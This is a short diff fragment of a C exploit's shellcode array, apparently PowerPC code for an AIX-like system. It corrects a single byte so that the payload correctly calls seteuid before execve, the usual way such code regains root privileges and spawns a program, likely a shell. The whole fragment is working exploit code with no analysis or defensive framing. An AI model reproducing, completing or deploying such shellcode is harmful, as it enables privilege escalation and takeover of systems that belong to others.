@@ -39,7 +39,7 @@ char shellcode[]=
                 "\x7e\xc8\x03\xa6" /* mtlr    r22                    */
                 "\x4c\xc6\x33\x42" /* crorc   cr6,cr6,cr6            */
                 "\x44\xff\xff\x02" /* svca                           */
-                "\xaa\x06\xff\xff" /* 0xab = seteuid 0x06 = execve   */
+                "\xab\x06\xff\xff" /* 0xab = seteuid 0x06 = execve   */
                 "\x38\x75\xff\x04" /* cal     r3,-252(r21)           */
                 "\x38\x95\xff\x0c" /* cal     r4,-244(r21)           */
                 "\x7e\x85\xa3\x78" /* mr      r5,r20                 */
